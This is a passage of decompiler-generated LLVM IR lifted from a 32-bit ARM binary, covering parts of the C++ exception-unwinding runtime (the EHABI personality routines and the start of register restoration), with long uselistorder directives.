dec_label_pc_18a88:                               ; preds = %bb161
  %v1_18a88 = load i32, i32* @sl, align 4
  %v9_18a88 = icmp eq i32 %v0_18a40, %v1_18a88
  br i1 %v9_18a88, label %dec_label_pc_18c78, label %dec_label_pc_18a90

dec_label_pc_18a90:                               ; preds = %dec_label_pc_18a88
  %v0_18a90 = load i32, i32* @r7, align 4
  %v1_18a90 = inttoptr i32 %v0_18a90 to i32*
  %v2_18a90 = load i32, i32* %v1_18a90, align 4
  %v1_18a94 = icmp slt i32 %v2_18a90, 0
  %v0_18a9c.pre = load i32, i32* @r6, align 4
  br i1 %v1_18a94, label %dec_label_pc_18a9c, label %dec_label_pc_18b5c

dec_label_pc_18a9c:                               ; preds = %dec_label_pc_18a90, %dec_label_pc_18b54
  %v0_18a9c = phi i32 [ %storemerge, %dec_label_pc_18b54 ], [ %v0_18a9c.pre, %dec_label_pc_18a90 ]
  store i32 %v0_18a9c, i32* %r0.global-to-local, align 4
  %v1_18aa0 = add i32 %v0_18a9c, 4
  store i32 %v1_18aa0, i32* @r6, align 4
  br label %dec_label_pc_18b5c

dec_label_pc_18aa8:                               ; preds = %bb154
  store i32 %v1_18828, i32* %r2.global-to-local, align 4
  br i1 %v2_18924, label %dec_label_pc_18ab4, label %dec_label_pc_18ba0

dec_label_pc_18ab4:                               ; preds = %dec_label_pc_18aa8
  %v2_18ab4 = icmp eq i32 %v0_18ab4, 0
  br i1 %v2_18ab4, label %dec_label_pc_18b20, label %dec_label_pc_18abc

dec_label_pc_18abc:                               ; preds = %dec_label_pc_18ab4
  %v0_18abc = load i32, i32* @r7, align 4
  %v1_18abc = add i32 %v0_18abc, 4
  %v2_18abc = inttoptr i32 %v1_18abc to i32*
  %v3_18abc = load i32, i32* %v2_18abc, align 4
  %v7_18ac0 = icmp eq i32 %v3_18abc, -2
  store i32 %v1_18abc, i32* %r2.global-to-local, align 4
  br i1 %v7_18ac0, label %dec_label_pc_189d8, label %dec_label_pc_18acc

dec_label_pc_18acc:                               ; preds = %dec_label_pc_18abc
  %v0_18acc = load i32, i32* @r8, align 4
  %v1_18acc = add i32 %v0_18acc, 88
  %v7_18ad0 = icmp eq i32 %v3_18abc, -1
  store i32 %v1_18acc, i32* %forced_unwind_-44, align 4
  br i1 %v7_18ad0, label %dec_label_pc_18b14, label %dec_label_pc_18adc

dec_label_pc_18adc:                               ; preds = %dec_label_pc_18acc
  %v2_18ae0 = icmp eq i32 %v3_18abc, 0
  br i1 %v2_18ae0, label %bb163, label %bb162

bb162:                                            ; preds = %dec_label_pc_18adc
  br label %bb163

bb163:                                            ; preds = %dec_label_pc_18adc, %bb162
  store i32 %v0_18acc, i32* %r0.global-to-local, align 4
  store i32 %v2_18af0, i32* %r2.global-to-local, align 4
  %v4_18afc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32 100) to i32*), align 4
  store i32 101128, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_18afc)
  %v0_18b08 = load i32, i32* %r0.global-to-local, align 4
  %v2_18b08 = icmp eq i32 %v0_18b08, 0
  br i1 %v2_18b08, label %bb164, label %.thread25

.thread25:                                        ; preds = %bb163
  %v3_18b14.pr = load i32, i32* %forced_unwind_-44, align 4
  br label %dec_label_pc_18b14

bb164:                                            ; preds = %bb163
  store i32 0, i32* %forced_unwind_-44, align 4
  br label %dec_label_pc_18b20

dec_label_pc_18b14:                               ; preds = %.thread25, %dec_label_pc_18acc
  %v3_18b14 = phi i32 [ %v3_18b14.pr, %.thread25 ], [ %v1_18acc, %dec_label_pc_18acc ]
  %v2_18b18 = icmp eq i32 %v3_18b14, 0
  br i1 %v2_18b18, label %dec_label_pc_18b20, label %dec_label_pc_18c78

dec_label_pc_18b20:                               ; preds = %bb164, %dec_label_pc_18bcc, %dec_label_pc_18ba0, %dec_label_pc_18b14, %dec_label_pc_18ab4
  %v0_18b20 = load i32, i32* @r7, align 4
  %v1_18b20 = add i32 %v0_18b20, 8
  %v1_18888 = inttoptr i32 %v1_18b20 to i32*
  %v2_18888 = load i32, i32* %v1_18888, align 4
  %v2_1888c = icmp eq i32 %v2_18888, 0
  br i1 %v2_1888c, label %dec_label_pc_18948, label %dec_label_pc_18894.preheader

dec_label_pc_18b28:                               ; preds = %entry
  %v3_18b28 = udiv i32 %v2_1881c, 65536
  store i32 2, i32* %r2.global-to-local, align 4
  %v6_18b38 = mul nuw nsw i32 %v3_18b28, 4
  %v3_18b3c = mul i32 %v2_1881c, 65536
  %v2_18b40 = add i32 %v6_18b38, %v4_1881c
  store i32 %v3_18b3c, i32* %v4_1883c, align 8
  br label %dec_label_pc_18864

dec_label_pc_18b50:                               ; preds = %bb159, %dec_label_pc_189fc
  %v1_18b50 = add i32 %v0_189ec, 4
  br label %dec_label_pc_18b54

dec_label_pc_18b54:                               ; preds = %dec_label_pc_18b94, %dec_label_pc_18b50
  %v0_18b54 = phi i32 [ %v2_18b94, %dec_label_pc_18b94 ], [ %v2_189ec, %dec_label_pc_18b50 ]
  %storemerge = phi i32 [ %v4_18b94, %dec_label_pc_18b94 ], [ %v1_18b50, %dec_label_pc_18b50 ]
  store i32 %storemerge, i32* @r6, align 4
  %v1_18b54 = icmp slt i32 %v0_18b54, 0
  br i1 %v1_18b54, label %dec_label_pc_18a9c, label %dec_label_pc_18b5c

dec_label_pc_18b5c:                               ; preds = %dec_label_pc_18a90, %dec_label_pc_18b54, %dec_label_pc_18c68, %dec_label_pc_18a9c
  %v0_18b60 = phi i32 [ %v1_18aa0, %dec_label_pc_18a9c ], [ %storemerge, %dec_label_pc_18b54 ], [ %v1_18c6c, %dec_label_pc_18c68 ], [ %v0_18a9c.pre, %dec_label_pc_18a90 ]
  %stack_var_-76.4 = phi i32 [ %stack_var_-76.2.ph3175, %dec_label_pc_18a9c ], [ %stack_var_-76.2.ph3175, %dec_label_pc_18b54 ], [ %v1_18c68, %dec_label_pc_18c68 ], [ %stack_var_-76.2.ph3175, %dec_label_pc_18a90 ]
  %v0_18b5c = load i32, i32* @sl, align 4
  %v3_18b5c = mul i32 %v0_18b5c, 4
  %v2_18b60 = add i32 %v3_18b5c, %v0_18b60
  %v1_1888865 = inttoptr i32 %v2_18b60 to i32*
  %v2_1888866 = load i32, i32* %v1_1888865, align 4
  %v2_1888c68 = icmp eq i32 %v2_1888866, 0
  br i1 %v2_1888c68, label %dec_label_pc_18948, label %dec_label_pc_18894.preheader.lr.ph

dec_label_pc_18b68:                               ; preds = %dec_label_pc_189e8
  %v0_18b78 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_18b78, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v0_18b80 = load i32, i32* @r8, align 4
  %v1_18b80 = add i32 %v0_18b80, 32
  %v2_18b80 = inttoptr i32 %v1_18b80 to i32*
  %v3_18b80 = load i32, i32* %v2_18b80, align 4
  store i32 %v3_18b80, i32* @r4, align 4
  %v5_18b84 = call i32 @_Unwind_VRS_Get(i32 %v0_18b78, i32 13, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_18b84, i32* %r0.global-to-local, align 4
  %v3_18b88 = load i32, i32* %stack_var_-48, align 4
  %v0_18b8c = load i32, i32* @r4, align 4
  %v9_18b8c = icmp eq i32 %v0_18b8c, %v3_18b88
  br i1 %v9_18b8c, label %dec_label_pc_18c34, label %dec_label_pc_18b68.dec_label_pc_18b94_crit_edge

dec_label_pc_18b68.dec_label_pc_18b94_crit_edge:  ; preds = %dec_label_pc_18b68
  %v0_18b94.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_18b94

dec_label_pc_18b94:                               ; preds = %dec_label_pc_18b68.dec_label_pc_18b94_crit_edge, %dec_label_pc_18c34
  %v0_18b94 = phi i32 [ %v0_18b94.pre, %dec_label_pc_18b68.dec_label_pc_18b94_crit_edge ], [ %v1_18c38, %dec_label_pc_18c34 ]
  %v1_18b94 = inttoptr i32 %v0_18b94 to i32*
  %v2_18b94 = load i32, i32* %v1_18b94, align 4
  %v4_18b94 = add i32 %v0_18b94, 4
  store i32 %v4_18b94, i32* @r7, align 4
  br label %dec_label_pc_18b54

dec_label_pc_18ba0:                               ; preds = %dec_label_pc_18aa8
  %v0_18bb0 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_18bb0, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v0_18bb8 = load i32, i32* @r8, align 4
  %v1_18bb8 = add i32 %v0_18bb8, 32
  %v2_18bb8 = inttoptr i32 %v1_18bb8 to i32*
  %v3_18bb8 = load i32, i32* %v2_18bb8, align 4
  store i32 %v3_18bb8, i32* @r4, align 4
  %v5_18bbc = call i32 @_Unwind_VRS_Get(i32 %v0_18bb0, i32 13, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_18bbc, i32* %r0.global-to-local, align 4
  %v3_18bc0 = load i32, i32* %stack_var_-48, align 4
  %v0_18bc4 = load i32, i32* @r4, align 4
  %v9_18bc4 = icmp eq i32 %v0_18bc4, %v3_18bc0
  br i1 %v9_18bc4, label %dec_label_pc_18bcc, label %dec_label_pc_18b20

dec_label_pc_18bcc:                               ; preds = %dec_label_pc_18ba0
  %v0_18bcc = load i32, i32* @r8, align 4
  %v1_18bcc = add i32 %v0_18bcc, 40
  %v2_18bcc = inttoptr i32 %v1_18bcc to i32*
  %v3_18bcc = load i32, i32* %v2_18bcc, align 4
  %v1_18bd0 = load i32, i32* @r7, align 4
  %v9_18bd0 = icmp eq i32 %v3_18bcc, %v1_18bd0
  br i1 %v9_18bd0, label %dec_label_pc_18bd8, label %dec_label_pc_18b20

dec_label_pc_18bd8:                               ; preds = %dec_label_pc_18bcc
  %v1_18bd8 = inttoptr i32 %v3_18bcc to i32*
  %v2_18bd8 = load i32, i32* %v1_18bd8, align 4
  %v1_18bdc = and i32 %v2_18bd8, 1073741824
  %v2_18bdc = icmp eq i32 %v1_18bdc, 0
  br i1 %v2_18bdc, label %.thread26, label %bb165

bb165:                                            ; preds = %dec_label_pc_18bd8
  %v2_18be0 = or i32 %v2_18bd8, -2147483648
  br label %bb166

.thread26:                                        ; preds = %dec_label_pc_18bd8
  %tmp208 = bitcast i32 %v2_18bd8 to float
  %tmp209 = call float @fabsf(float %tmp208)
  %v2_18be4 = bitcast float %tmp209 to i32
  br label %bb166

bb166:                                            ; preds = %bb165, %bb169, %.thread28, %.thread26
  %v1_18be8 = phi i32 [ %v2_18d18, %.thread28 ], [ %v2_18d18, %bb169 ], [ %v3_18bcc, %bb165 ], [ %v3_18bcc, %.thread26 ]
  %v0_18be8 = phi i32 [ %v2_18d28, %.thread28 ], [ %v2_18d24, %bb169 ], [ %v2_18be0, %bb165 ], [ %v2_18be4, %.thread26 ]
  %v2_18be8 = add i32 %v0_18be8, %v1_18be8
  store i32 %v2_18be8, i32* %stack_var_-48, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v0_18c00 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_18c00, i32* %r0.global-to-local, align 4
  %v5_18c08 = call i32 @_Unwind_VRS_Set(i32 %v0_18c00, i32 0, i32 15, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v0_18c00, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_18c20 = load i32, i32* @r8, align 4
  store i32 %v0_18c20, i32* %stack_var_-48, align 4
  %v5_18c28 = call i32 @_Unwind_VRS_Set(i32 %v0_18c00, i32 0, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 7, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_189dc

dec_label_pc_18c34:                               ; preds = %dec_label_pc_18b68
  %v0_18c34 = load i32, i32* @r8, align 4
  %v1_18c34 = add i32 %v0_18c34, 40
  %v2_18c34 = inttoptr i32 %v1_18c34 to i32*
  %v3_18c34 = load i32, i32* %v2_18c34, align 4
  %v1_18c38 = load i32, i32* @r7, align 4
  %v9_18c38 = icmp eq i32 %v3_18c34, %v1_18c38
  br i1 %v9_18c38, label %dec_label_pc_18c40, label %dec_label_pc_18b94

dec_label_pc_18c40:                               ; preds = %dec_label_pc_18c34
  %v1_18c44 = add i32 %v3_18c34, 4
  store i32 %v1_18c44, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v2_18c4c = add i32 %v0_18c34, 44
  %v3_18c4c = inttoptr i32 %v2_18c4c to i32*
  store i32 0, i32* %v3_18c4c, align 4
  %v0_18c50 = load i32, i32* %r2.global-to-local, align 4
  %v1_18c50 = load i32, i32* @r8, align 4
  %v2_18c50 = add i32 %v1_18c50, 48
  %v3_18c50 = inttoptr i32 %v2_18c50 to i32*
  store i32 %v0_18c50, i32* %v3_18c50, align 4
  %v0_18c54 = load i32, i32* @sl, align 4
  %v1_18c54 = load i32, i32* @r8, align 4
  %v2_18c54 = add i32 %v1_18c54, 40
  %v3_18c54 = inttoptr i32 %v2_18c54 to i32*
  store i32 %v0_18c54, i32* %v3_18c54, align 4
  %v0_18c58 = load i32, i32* %r0.global-to-local, align 4
  %v1_18c58 = load i32, i32* @r8, align 4
  %v2_18c58 = add i32 %v1_18c58, 52
  %v3_18c58 = inttoptr i32 %v2_18c58 to i32*
  store i32 %v0_18c58, i32* %v3_18c58, align 4
  %v0_18c5c = load i32, i32* @r7, align 4
  %v1_18c5c = inttoptr i32 %v0_18c5c to i32*
  %v2_18c5c = load i32, i32* %v1_18c5c, align 4
  %v1_18c60 = icmp slt i32 %v2_18c5c, 0
  br i1 %v1_18c60, label %dec_label_pc_18c68, label %dec_label_pc_18d14

dec_label_pc_18c68:                               ; preds = %dec_label_pc_18c40
  %v0_18c68 = load i32, i32* %r2.global-to-local, align 4
  %v1_18c68 = add i32 %v0_18c68, -3
  store i32 %v1_18c68, i32* %r2.global-to-local, align 4
  %v0_18c6c = load i32, i32* %r0.global-to-local, align 4
  %v1_18c6c = add i32 %v0_18c6c, 4
  store i32 %v1_18c6c, i32* @r6, align 4
  br label %dec_label_pc_18b5c

dec_label_pc_18c78:                               ; preds = %dec_label_pc_18a88, %dec_label_pc_18b14, %dec_label_pc_18a40, %dec_label_pc_18a14.thread
  store i32 13, i32* %r2.global-to-local, align 4
  %v0_18c88 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_18c88, i32* %r0.global-to-local, align 4
  %v5_18c90 = call i32 @_Unwind_VRS_Get(i32 %v0_18c88, i32 13, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  %v0_18c94 = load i32, i32* @r7, align 4
  %v1_18c94 = load i32, i32* @r8, align 4
  %v2_18c94 = add i32 %v1_18c94, 40
  %v3_18c94 = inttoptr i32 %v2_18c94 to i32*
  store i32 %v0_18c94, i32* %v3_18c94, align 4
  %v3_18c98 = load i32, i32* %stack_var_-48, align 4
  %v3_18c9c = load i32, i32* %forced_unwind_-44, align 4
  store i32 %v3_18c9c, i32* %r2.global-to-local, align 4
  store i32 6, i32* %r0.global-to-local, align 4
  %v1_18ca4 = load i32, i32* @r8, align 4
  %v2_18ca4 = add i32 %v1_18ca4, 32
  %v3_18ca4 = inttoptr i32 %v2_18ca4 to i32*
  store i32 %v3_18c98, i32* %v3_18ca4, align 4
  %v0_18ca8 = load i32, i32* %r2.global-to-local, align 4
  %v1_18ca8 = load i32, i32* @r8, align 4
  %v2_18ca8 = add i32 %v1_18ca8, 36
  %v3_18ca8 = inttoptr i32 %v2_18ca8 to i32*
  store i32 %v0_18ca8, i32* %v3_18ca8, align 4
  %v1_189e4.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_189dc

dec_label_pc_18cb0:                               ; preds = %bb155
  %v1_18cb0 = inttoptr i32 %v0_18938 to i32*
  %v2_18cb0 = load i32, i32* %v1_18cb0, align 4
  %v1_18cb4 = add i32 %v0_18938, 4
  %v1_18cb8 = and i32 %v2_18cb0, 1073741824
  %v2_18cb8 = icmp eq i32 %v1_18cb8, 0
  %v2_18cbc = or i32 %v2_18cb0, -2147483648
  %tmp210 = bitcast i32 %v2_18cb0 to float
  %tmp211 = call float @fabsf(float %tmp210)
  %v2_18cc0 = bitcast float %tmp211 to i32
  %storemerge122 = select i1 %v2_18cb8, i32 %v2_18cc0, i32 %v2_18cbc
  store i32 %storemerge122, i32* %r4.global-to-local, align 4
  %v1_18cc4 = load i32, i32* @r8, align 4
  %v2_18cc4 = add i32 %v1_18cc4, 56
  %v3_18cc4 = inttoptr i32 %v2_18cc4 to i32*
  store i32 %v1_18cb4, i32* %v3_18cc4, align 4
  %v0_18cc8 = load i32, i32* @r8, align 4
  store i32 %v0_18cc8, i32* %r0.global-to-local, align 4
  %v4_18cd4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32 28) to i32*), align 4
  store i32 101600, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_18cd4)
  %v0_18ce0 = load i32, i32* %r0.global-to-local, align 4
  %v2_18ce0 = icmp eq i32 %v0_18ce0, 0
  br i1 %v2_18ce0, label %dec_label_pc_189d8, label %dec_label_pc_18ce8

dec_label_pc_18ce8:                               ; preds = %dec_label_pc_18cb0
  %v0_18ce8 = load i32, i32* %r4.global-to-local, align 4
  %v1_18ce8 = load i32, i32* @r7, align 4
  %v2_18ce8 = add i32 %v1_18ce8, %v0_18ce8
  store i32 %v2_18ce8, i32* %stack_var_-48, align 4
  %v0_18cf8 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_18cf8, i32* %r0.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v5_18d08 = call i32 @_Unwind_VRS_Set(i32 %v0_18cf8, i32 0, i32 15, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 7, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_189dc

dec_label_pc_18d14:                               ; preds = %dec_label_pc_18c40
  %v0_18d14 = load i32, i32* @sl, align 4
  %v3_18d14 = mul i32 %v0_18d14, 4
  %v0_18d18 = load i32, i32* %r0.global-to-local, align 4
  %v2_18d18 = add i32 %v0_18d18, %v3_18d14
  %v3_18d18 = inttoptr i32 %v2_18d18 to i32*
  %v4_18d18 = load i32, i32* %v3_18d18, align 4
  %v1_18d1c = and i32 %v4_18d18, 1073741824
  %v2_18d1c = icmp eq i32 %v1_18d1c, 0
  br i1 %v2_18d1c, label %.thread28, label %bb169

bb169:                                            ; preds = %dec_label_pc_18d14
  %v2_18d24 = or i32 %v4_18d18, -2147483648
  br label %bb166

.thread28:                                        ; preds = %dec_label_pc_18d14
  %tmp212 = bitcast i32 %v4_18d18 to float
  %tmp213 = call float @fabsf(float %tmp212)
  %v2_18d28 = bitcast float %tmp213 to i32
  br label %bb166

; uselistorder directives
  uselistorder i32 %v2_18d18, { 2, 1, 0 }
  uselistorder i32 %v1_18c6c, { 1, 0 }
  uselistorder i32 %v1_18c68, { 1, 0 }
  uselistorder i32 %v1_18c38, { 1, 0 }
  uselistorder i32 %v0_18c00, { 1, 0, 2, 3 }
  uselistorder i32 %v3_18bcc, { 1, 2, 0, 3 }
  uselistorder i32 %v4_18b94, { 1, 0 }
  uselistorder i32 %v0_18b94, { 1, 0 }
  uselistorder i32 %v2_1888866, { 1, 0 }
  uselistorder i32 %v2_18b60, { 1, 0 }
  uselistorder i32 %stack_var_-76.4, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v2_18888, { 1, 0 }
  uselistorder i32 %v1_18b20, { 1, 0 }
  uselistorder i32 %v3_18abc, { 2, 0, 1 }
  uselistorder i32 %v0_18a9c, { 1, 0 }
  uselistorder i32 %v0_18a9c.pre, { 1, 0 }
  uselistorder i32 %v1_189f4, { 1, 0 }
  uselistorder i32 %v2_189ec, { 1, 0 }
  uselistorder i32 %v0_1897c, { 1, 0, 2, 3 }
  uselistorder i32 %stack_var_-76.3, { 1, 0 }
  uselistorder i32 %v2_1893c, { 1, 0 }
  uselistorder i32 %v1_18938, { 1, 0 }
  uselistorder i32 %v0_18938, { 1, 0, 2 }
  uselistorder i32 %v4_18910, { 0, 2, 1, 3 }
  uselistorder i32 %v0_18ab4, { 1, 2, 0 }
  uselistorder i32 %v0_188e8, { 1, 0 }
  uselistorder i32 %v3_188e4, { 1, 0, 2 }
  uselistorder i32 %v1_188b8, { 0, 2, 4, 1, 3 }
  uselistorder i32 %stack_var_-76.2.ph3175, { 2, 3, 4, 0, 1 }
  uselistorder i32 %v2_18af0, { 1, 0 }
  uselistorder i1 %v2_18924, { 1, 0, 2 }
  uselistorder i32 %v1_18828, { 4, 3, 1, 2, 6, 5, 0 }
  uselistorder i32* %stack_var_-48, { 1, 2, 3, 4, 5, 6, 7, 0, 9, 8 }
  uselistorder %anon_struct_4* %uws_-60, { 1, 0 }
  uselistorder i32* %forced_unwind_-44, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 7, 6, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 18, 19, 20, 0 }
  uselistorder i32* %r0.global-to-local, { 8, 1, 2, 3, 4, 5, 6, 7, 9, 10, 11, 13, 12, 14, 16, 15, 23, 17, 18, 19, 20, 21, 22, 25, 27, 26, 29, 28, 30, 31, 33, 32, 35, 34, 24, 0 }
  uselistorder i32* %fp.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 8, 7, 9 }
  uselistorder i32 6, { 71, 0, 15, 16, 70, 4, 28, 29, 18, 19, 20, 17, 27, 2, 1, 5, 30, 31, 32, 6, 33, 34, 35, 36, 7, 37, 38, 39, 40, 8, 41, 9, 42, 43, 21, 44, 10, 45, 46, 47, 22, 48, 11, 49, 50, 51, 23, 52, 53, 54, 24, 55, 12, 56, 57, 58, 59, 25, 60, 13, 61, 62, 63, 64, 65, 66, 26, 67, 14, 68, 3, 69 }
  uselistorder i32 -3, { 4, 0, 5, 7, 6, 3, 1, 2 }
  uselistorder i32 52, { 23, 1, 2, 5, 12, 13, 9, 10, 11, 14, 16, 15, 6, 18, 19, 3, 20, 0, 21, 22, 7, 8, 17, 4 }
  uselistorder i32 48, { 17, 2, 0, 6, 4, 5, 9, 10, 7, 8, 14, 15, 16, 11, 12, 3, 13, 1 }
  uselistorder i32 44, { 40, 2, 41, 42, 0, 13, 3, 14, 4, 5, 6, 24, 25, 26, 27, 28, 29, 21, 22, 23, 7, 19, 20, 8, 1, 9, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 10, 11, 12, 15, 16, 17, 18 }
  uselistorder i32 -2147483648, { 3, 4, 5, 6, 7, 8, 9, 10, 0, 1, 2 }
  uselistorder i32 1073741824, { 4, 5, 6, 7, 8, 9, 10, 11, 0, 1, 2, 3 }
  uselistorder i32 65536, { 4, 5, 6, 7, 9, 8, 14, 10, 15, 11, 16, 12, 17, 13, 18, 19, 20, 24, 21, 25, 22, 26, 23, 27, 151, 156, 150, 29, 28, 155, 30, 31, 32, 33, 34, 35, 36, 149, 37, 38, 39, 41, 40, 43, 42, 44, 45, 2, 46, 0, 3, 47, 48, 50, 49, 1, 53, 51, 52, 54, 59, 55, 60, 56, 61, 57, 58, 62, 63, 64, 65, 67, 68, 66, 148, 70, 69, 73, 74, 75, 71, 72, 78, 76, 79, 77, 80, 81, 82, 83, 84, 86, 87, 85, 88, 152, 90, 89, 93, 94, 95, 91, 92, 96, 97, 99, 100, 101, 98, 102, 153, 103, 105, 104, 107, 106, 108, 154, 109, 111, 110, 113, 112, 115, 116, 114, 117, 118, 125, 119, 126, 120, 127, 121, 128, 122, 129, 123, 124, 131, 130, 132, 133, 134, 135, 140, 136, 141, 137, 142, 138, 139, 144, 143, 145, 146, 147 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32 100) to i32*), { 1, 0 }
  uselistorder i32 88, { 5, 6, 3, 0, 4, 1, 2 }
  uselistorder i32 100, { 0, 1, 3, 2, 4 }
  uselistorder i32 ptrtoint (i32* @global_var_21d10.338 to i32), { 28, 6, 29, 30, 7, 8, 64, 82, 83, 1, 2, 0, 3, 65, 66, 84, 9, 67, 85, 10, 11, 12, 13, 14, 27, 68, 86, 69, 87, 15, 16, 70, 71, 72, 88, 17, 89, 90, 91, 18, 92, 19, 73, 93, 94, 20, 21, 22, 95, 74, 96, 23, 97, 24, 98, 99, 100, 4, 26, 101, 75, 102, 77, 103, 25, 104, 105, 106, 34, 33, 35, 107, 108, 31, 59, 55, 53, 52, 54, 56, 57, 58, 51, 60, 46, 48, 47, 45, 44, 49, 50, 41, 40, 43, 42, 39, 38, 37, 36, 79, 61, 78, 62, 63, 80, 109, 5, 110, 111, 112, 113, 114, 32, 76, 115, 81 }
  uselistorder i32 -2, { 0, 30, 31, 6, 3, 4, 2, 7, 8, 9, 1, 5, 10, 26, 25, 27, 28, 29, 18, 19, 20, 21, 22, 23, 24, 11, 12, 13, 14, 15, 16, 17 }
  uselistorder i32 80, { 10, 11, 12, 0, 2, 1, 3, 4, 5, 8, 6, 7, 9 }
  uselistorder i32 %ucbp, { 0, 1, 3, 2 }
  uselistorder i32 %state, { 1, 0, 2 }
  uselistorder label %dec_label_pc_18c78, { 1, 0, 2, 3 }
  uselistorder label %bb166, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_18b94, { 1, 0 }
  uselistorder label %dec_label_pc_18b5c, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_18b20, { 1, 2, 3, 0, 4 }
  uselistorder label %bb163, { 1, 0 }
  uselistorder label %dec_label_pc_18a9c, { 1, 0 }
  uselistorder label %bb161, { 1, 0 }
  uselistorder label %dec_label_pc_189dc, { 1, 2, 3, 5, 4, 0 }
  uselistorder label %dec_label_pc_189d8, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_18938, { 1, 0 }
  uselistorder label %bb154, { 2, 0, 1 }
  uselistorder label %bb152, { 1, 0 }
  uselistorder label %dec_label_pc_18894, { 1, 0 }
  uselistorder label %dec_label_pc_18894.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_18894.preheader.lr.ph, { 1, 0 }
  uselistorder label %bb148, { 1, 0 }
}

define i32 @function_18d34(i32 %arg1) local_unnamed_addr {
dec_label_pc_18d34:
  %v0_18d34 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_18d34, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_18d34
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_18d34, %bb
  %v10_18d3c = phi i32 [ %arg1, %dec_label_pc_18d34 ], [ 0, %bb ]
  ret i32 %v10_18d3c

; uselistorder directives
  uselistorder i1 false, { 0, 1, 2, 3, 26, 27, 28, 44, 22, 25, 45, 46, 47, 48, 49, 5, 4, 50, 40, 41, 29, 30, 23, 33, 32, 31, 34, 6, 8, 7, 20, 43, 42, 24, 19, 36, 12, 37, 21, 11, 10, 9, 13, 14, 15, 16, 17, 18, 39, 35, 38, 51, 52 }
  uselistorder i1* @cpsr_z, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 42, 14, 15, 16, 38, 39, 40, 41, 0, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 36, 37, 34, 35 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__aeabi_unwind_cpp_pr2(i32 %state, i32 %ucbp, i32 %context) local_unnamed_addr {
entry:
  %v1_18d44 = load i32, i32* @r1, align 4
  %v2_18d44 = load i32, i32* @r2, align 4
  %v4_18d44 = call i32 @__gnu_unwind_pr_common(i32 2, i32 %v1_18d44, i32 %v2_18d44, i32 2)
  ret i32 %v4_18d44
}

define i32 @__aeabi_unwind_cpp_pr1(i32 %state, i32 %ucbp, i32 %context) local_unnamed_addr {
entry:
  %v1_18d4c = load i32, i32* @r1, align 4
  %v2_18d4c = load i32, i32* @r2, align 4
  %v4_18d4c = call i32 @__gnu_unwind_pr_common(i32 1, i32 %v1_18d4c, i32 %v2_18d4c, i32 1)
  ret i32 %v4_18d4c
}

define i32 @__aeabi_unwind_cpp_pr0(i32 %state, i32 %ucbp, i32 %context) local_unnamed_addr {
entry:
  %v1_18d54 = load i32, i32* @r1, align 4
  %v2_18d54 = load i32, i32* @r2, align 4
  %v4_18d54 = call i32 @__gnu_unwind_pr_common(i32 0, i32 %v1_18d54, i32 %v2_18d54, i32 0)
  ret i32 %v4_18d54

; uselistorder directives
  uselistorder i32 (i32, i32, i32, i32)* @__gnu_unwind_pr_common, { 2, 1, 0 }
  uselistorder i32* @r2, { 8, 10, 9, 55, 11, 0, 20, 12, 21, 56, 57, 58, 16, 17, 18, 19, 38, 39, 40, 41, 59, 60, 61, 72, 73, 74, 75, 64, 1, 65, 62, 63, 35, 36, 2, 3, 4, 53, 54, 5, 6, 66, 67, 68, 69, 70, 71, 42, 43, 44, 45, 46, 48, 24, 13, 14, 15, 27, 28, 25, 26, 22, 23, 29, 30, 31, 32, 33, 34, 37, 7, 47, 49, 50, 51, 52 }
}

define i32 @__restore_core_regs(i32* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %v3_18d5c = add i32 %tmp, 56
  %v4_18d5c = inttoptr i32 %v3_18d5c to i32*
  %v5_18d5c = load i32, i32* %v4_18d5c, align 4
  %v6_18d5c = add i32 %tmp, 60
  %v7_18d5c = inttoptr i32 %v6_18d5c to i32*
  %v8_18d5c = load i32, i32* %v7_18d5c, align 4
  %v2_18d68 = load i32, i32* %arg1, align 4
  %v3_18d68 = add i32 %tmp, 4
